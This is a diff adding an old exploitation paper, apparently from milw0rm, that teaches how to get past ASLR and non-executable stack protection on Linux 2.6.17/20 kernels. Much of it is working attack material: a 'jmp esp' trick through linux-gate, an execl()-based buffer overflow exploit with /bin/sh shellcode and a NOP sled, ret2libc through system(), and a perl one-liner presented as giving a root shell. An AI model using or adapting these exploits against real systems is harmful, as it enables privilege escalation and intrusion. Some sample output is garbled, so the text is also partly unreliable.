@@ -1,0 +1,312 @@
+<html>
+<head>
+<title>ASLR bypassing method on 2.6.17/20 Linux Kernel</title>
+<pre>
+{===============================================================}
+{                                                               }
+{      ASLR bypassing method on 2.6.17/20 Linux Kernel          }
+{      No-executable stack space bypassing method on Linux      }
+{                                                               }      
+{===============================================================}
+
+A paper by the FHM crew:
+
+http://fhm.noblogs.org
+
+
+Contact us at:
+
+--------------------------------------------------
+
+sorrow: rawhazard@autistici.org; betat@hotmail.it
+
+--------------------------------------------------
+fhm: fhm@autistici.org;
+
+--------------------------------------------------
+
+Rrequirements:
+1. Shellcoding
+2. C programming
+3. Howto bash and gdb works
+4. A brain
+
+==[1. ASLR]==
+
+
+
+ASLR is a countermeasure based on the randomization of the stack memory.
+Say that we have a variable located on the stack. If the kernel 
+is compiled with the aslr option active,we can't determine what 
+would be his address, beacause it is randomized. Look at this source:
+
+
+
+#include &lt;stdio.h&gt;
+
+#include &lt;stdlib.h&gt;
+
+
+
+int main (int argc, char *argv[]) {
+
+
+
+char *addr;
+
+
+
+addr=getenv(argv[1]);
+
+printf(&quot;%s is at: %p\n&quot;, argv[1], addr);
+
+return 0;
+
+}
+
+
+
+The getenv() function returns the address of the enviroment 
+variable passed as argument.You can try with PWD or exporting 
+a new enviroment address,and you will notice that the returned 
+address is never the same. It's beacause of aslr.
+
+But aslr protection can be bypassed. How? Don't stop reading.
+
+
+
+If you are using the 2.6.17 version of the linux kernel,
+you can exploit the linux-gate shared object to bypass the protection. 
+Let's see how.Launching the ldd command we can see the dependencies 
+of a program,and we discover that every program has a shared object 
+always at the same address.
+The object is the mentioned linux-gate:
+
+
+
+fhm@local$ ldd /bin/ls
+
+      linux-gate.so.1 =&gt; (0xffffe000)
+
+      linux.so.1 =&gt; /lib/librt.so.1 (0xb7f95000)
+
+      linx.so.6 =&gt; /lib/libc.so.6 (0xb7e75000)
+
+      libpthread.so.0 =&gt; /lib/libpthread.so.0 (0xb7e62000)
+
+      /lib/ld-linux.so.2 (0xb7fb1000)
+
+fhm@local$ ldd /bin/ls
+
+      linux-gate.so.1 =&gt; (0xffffe000)
+
+      linux.so.1 =&gt; /lib/librt.so.1 (0xb7fa5000)
+
+      linx.so.6 =&gt; /lib/libc.so.6 (0xb7e73000)
+
+      libpthread.so.0 =&gt; /lib/libpthread.so.0 (0xb7e1d000)
+
+      /lib/ld-linux.so.2 (0xb7f6a000)
+
+fhm@local$ 
+
+
+
+What does this mean? It's easy. It means that every program share 
+the same istructions located in linux-gate.
+Now we'll look for a particular istrunction:
+
+jmp esp. This istrunction make EIP jump to the positione of ESP. 
+It's particularly useful because we could place our shellcode in the stack,
+and to execute it we can &quot;redirect&quot; the eip to that area of memory.
+
+The hex of jmp esp is ff e4. We can now easily write a program to 
+find this pattern, and we'll realize that it's located at 0xffffe777.
+
+Now we can overwrite the return address of a vulnerable function 
+with the address 0xffffe777and place the shellode on the stack, 
+doing this, the program will jump to the place of memory 
+pointed by esp and will exe it. Then it will exe our shellcode. =)
+
+But there is a problem. All this work just under 2.6.17 Linux Kernel. 
+If we check for linux-gate address in a update system (2.6.20) 
+we'll see that it's randomized:
+
+fhm@local$ ldd /bin/ls
+      linux-gate.so.1 =&gt;  (0xb7f78000)
+      librt.so.1 =&gt; /lib/tls/i686/cmov/librt.so.1 (0xb7f5e000)
+      libselinux.so.1 =&gt; /lib/libselinux.so.1 (0xb7f45000)
+      libacl.so.1 =&gt; /lib/libacl.so.1 (0xb7f3d000)
+      libc.so.6 =&gt; /lib/tls/i686/cmov/libc.so.6 (0xb7dee000)
+      libpthread.so.0 =&gt; /lib/tls/i686/cmov/libpthread.so.0 (0xb7dd6000)
+      /lib/ld-linux.so.2 (0xb7f79000)
+      libdl.so.2 =&gt; /lib/tls/i686/cmov/libdl.so.2 (0xb7dd2000)
+      libattr.so.1 =&gt; /lib/libattr.so.1 (0xb7dce000)
+fhm@local$ ldd /bin/ls
+      linux-gate.so.1 =&gt;  (0xb7fd7000)
+      librt.so.1 =&gt; /lib/tls/i686/cmov/librt.so.1 (0xb7fbd000)
+      libselinux.so.1 =&gt; /lib/libselinux.so.1 (0xb7fa4000)
+      libacl.so.1 =&gt; /lib/libacl.so.1 (0xb7f9c000)
+      libc.so.6 =&gt; /lib/tls/i686/cmov/libc.so.6 (0xb7e4d000)
+      libpthread.so.0 =&gt; /lib/tls/i686/cmov/libpthread.so.0 (0xb7e35000)
+      /lib/ld-linux.so.2 (0xb7fd8000)
+      libdl.so.2 =&gt; /lib/tls/i686/cmov/libdl.so.2 (0xb7e31000)
+      libattr.so.1 =&gt; /lib/libattr.so.1 (0xb7e2d000)
+fhm@local$
+
+So, what now? I think there could be lots of way to solve out 
+this problem. One of this could be the following.
+The execl() function family includes these functions:
+
+int execl(const char *path, const char *arg, ...);
+int execlp(const char *file, const char *arg, ...);
+int execle(const char *path, const char *arg, ..., char * const envp[]);
+int execv(const char *path, char *const argv[]);
+int execvp(const char *file, char *const argv[]);
+
+These functions replaces the image of the exisisting process with the one 
+of a new process. 
+Now we'll use the execl() function in a program and let's see what happen. 
+Here the source:
+
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+int main (int argc, char *argv[]) {
+   int var;
+   
+   printf(&quot;Var is at %p\n&quot;, &amp;var);
+   execl(&quot;./try&quot;, &quot;try&quot;, NULL);
+}
+
+The execl() functions call another program called &quot;try&quot;, here the source:
+
+#include &lt;stdio.h&gt;
+int main (int argc, char *argv[]) {
+   char buffer[50];
+   
+   printf(&quot;buffer is at %p\n&quot;, &amp;buffer);
+   if(argc &gt; 1)
+      strcpy(buffer, argv[1]);
+   return 1;
+}
+
+How you can see, try have a bof vulnerability in the code. 
+But with the aslr protection it cant be exploited normally. Anyway, 
+compile and launch sometimes the first script. You should have 
+a output easy to understand. The execl() function reduces 
+randomization and we can focus on a address range. 
+The remaining uncertainty can be easily covered by a large nop sled. 
+To know exactly how large must be the NOP sled we can use gdb...remember
+he is your best friend :). 
+An exploit like this could work:
+
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+
+char shellcode[]=
+&quot;\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68&quot;
+&quot;\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89&quot;
+&quot;\xe1\xcd\x80&quot;; // Standard shellcode
+int main(int argc, char *argv[]) {
+   unsigned int i, ret, offset;
+   char buffer[1000];
+   printf(&quot;i is at %p\n&quot;, &amp;i);
+   if(argc &gt; 1) // Set offset.
+      offset = atoi(argv[1]);
+   ret = (unsigned int) &amp;i - offset + 200; // Set return address.
+   printf(&quot;ret addr is %p\n&quot;, ret);
+for(i=0; i &lt; 90; i+=4) // Fill buffer with return address.
+     *((unsigned int *)(buffer+i)) = ret;
+  memset(buffer+84, 0x90, 900); // Build NOP sled.
+  memcpy(buffer+900, shellcode, sizeof(shellcode));
+  execl(&quot;./aslr_demo&quot;, &quot;aslr_demo&quot;, buffer,  NULL);
+}
+
+Sometimes could happen that randomization make exploit fails. Try some more times 
+and try some new offset keeping near the specified one.
+Of course, you can use try with a bruteforce...damn it's not a smart solution! :P
+
+==[2. No-executable stack]==
+
+Lots of application dont need to execute something in the stack. 
+Then how make the stack executable?. 
+This countermeasure is really powerful beacuse shellcode cant be pushed in the stack, 
+it would be useless. Obviously there are some hacks to bypass this protection. 
+One of this is called &quot;ret2libc&quot;, 
+return to libc; libc is a standard C library that contains lots of basic functions 
+like printf() and exit(). System() too.
+This function requires just one argument, the name of the program to execute. 
+Now idea is the following:
+force the target application to return to system() in the libc library
+without have to execute something in the stack space. First we have to find
+the position of that function in the library, it will be different for each system,
+but once found will remain the same until recompile libc. One of the easiest ways
+to find out this address is to write a small script that use this function:
+
+int main()
+{ system(); }
+
+Then compile this &quot;source&quot; and make it run under gdb. 
+Break at main. Then &quot;print system&quot;.
+You should obtain something like this:
+
+//Run and break at main()
+(gdb) print system
+$1 = {&lt;text variable, no debug info&gt;} 0xb7ecfd80 &lt;system&gt;
+(gdb) q
+
+In this case the address is 0xb7ecfd80. Now we can redirect the execution flow 
+of a process to the system() function. But to obtain a shell we have to
+pass an argument to the function, /bin/sh maybe?
+In the stack the call to ret2libc will be formed by the function address,
+the return address and the arguments. The return address is not important 
+beacuse system()will open a shell then it wont return to any address while in use. 
+Then we can use anything as return addres, the string &quot;ADDR&quot; too. 
+We can store the string &quot;/bin/sh&quot; everywhere in memory, for example in a 
+enviroment variable. In the end we have to find out the offset to overwrite the return 
+address of the victim program, like this(sample code):
+
+#include &lt;string.h&gt;
+int main (int argc, char *argv[]) {
+   char buffer[5];
+
+   strcpy(buffer, argv[1]);
+   return 0;
+}
+
+To find the address of the enviroment variable, we can use a script like this:
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+int main (int argc, char *argv[]){
+char *ptr;
+char tprg_name [20] = &quot;&quot;;
+char var[50];
+
+if (argc &lt; 2){
+    printf(&quot;Usage: %s &lt;enviroment var&gt; [target program name]\n&quot;,argv[0]);
+}
+
+if (argc &gt; 2){
+    strcpy(tprg_name,argv[2]);
+}
+
+ptr = getenv(argv[1]); /* Get env var location */
+ptr += (strlen(argv[0]) - strlen(tprg_name))*2; /* Adjust for program name */
+printf(&quot;%s will be at %p\n&quot;,argv[1], ptr);
+}
+
+Once found the address of the enviroment variable (suppose it's 0xbffffe5b) 
+and the offset (gdb?) we can launch the target program, in this way:
+
+fhm@local$ ./target $(perl -e 'print &quot;ABCD&quot;x&lt;offset&gt; . &quot;\x80\xfd\xec\xb7ADDR\x5b\xfe\xff\xbf&quot;')
+
+And you will obtain a root shell.
+(If it doesnt work try exporting in the enviroment variable a string like 
+&quot;         /bin/sh&quot; (with space) it could work like a NOP sled).
+
+# milw0rm.com [2008-09-02]</pre>
+</html>
